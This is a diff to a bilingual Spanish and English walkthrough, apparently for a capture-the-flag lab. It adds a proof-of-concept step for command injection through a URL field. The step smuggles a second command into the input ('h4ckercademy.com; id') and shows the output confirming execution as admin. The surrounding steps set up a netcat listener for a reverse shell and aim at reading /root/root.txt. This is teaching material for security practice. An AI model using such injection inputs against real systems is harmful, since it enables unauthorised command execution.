@@ -74,6 +74,20 @@
     Cualquier separador de comandos en la URL se interpreta por la shell de <code>admin</code>, permitiendo ejecutar código arbitrario.
     La reverse shell llega como <strong>admin</strong> (UID 1000), no como root — es necesario escalar privilegios para leer <code>/root/root.txt</code>.</p>
 
+    <h3>Prueba de concepto — Verificar la inyección</h3>
+    <p>Antes de lanzar la reverse shell, confirma que la inyección funciona. Introduce esto en el campo URL:</p>
+    <pre>h4ckercademy.com; id</pre>
+    <p>La respuesta debe mostrar la salida del curl seguida de la ejecución de <code>id</code>:</p>
+    <pre>HTTP Status  : 200
+URL final    : https://h4ckercademy.com/
+Content-Type : text/html; charset=UTF-8
+Tamaño       : 450740 bytes
+Tiempo total : 0.880255s
+Redirecciones: 1
+IP remota    : 62.72.37.3:443
+uid=1000(admin) gid=1000(admin) groups=1000(admin)</pre>
+    <p>Si ves la línea <code>uid=1000(admin)</code>, tienes ejecución de comandos como <strong>admin</strong>. Ahora lanza la reverse shell.</p>
+
     <h3>Paso 0 — Preparar el listener</h3>
     <p>En tu máquina atacante (Kali / máquina con acceso de red al servidor), antes de enviar el payload:</p>
     <pre>nc -lvnp 4444</pre>
@@ -145,6 +159,20 @@ cat /root/root.txt</pre>
     <p>The server runs <code>su -s /bin/sh admin -c "curl -s -o /dev/null -w '%{http_code}' --max-time 5 URL"</code> with <code>shell=True</code>.
     Any command separator in the URL is interpreted by <code>admin</code>'s shell, allowing arbitrary code execution.
     The reverse shell lands as <strong>admin</strong> (UID 1000), not root — privilege escalation is required to read <code>/root/root.txt</code>.</p>
+
+    <h3>Proof of concept — Verify the injection</h3>
+    <p>Before launching the reverse shell, confirm that injection works. Enter this in the URL field:</p>
+    <pre>h4ckercademy.com; id</pre>
+    <p>The response should show the curl output followed by the <code>id</code> command execution:</p>
+    <pre>HTTP Status  : 200
+URL final    : https://h4ckercademy.com/
+Content-Type : text/html; charset=UTF-8
+Tamaño       : 450740 bytes
+Tiempo total : 0.880255s
+Redirecciones: 1
+IP remota    : 62.72.37.3:443
+uid=1000(admin) gid=1000(admin) groups=1000(admin)</pre>
+    <p>If you see <code>uid=1000(admin)</code>, you have command execution as <strong>admin</strong>. Now launch the reverse shell.</p>
 
     <h3>Step 0 — Set up the listener</h3>
     <p>On your attacker machine (Kali / machine with network access to the server), before sending the payload:</p>
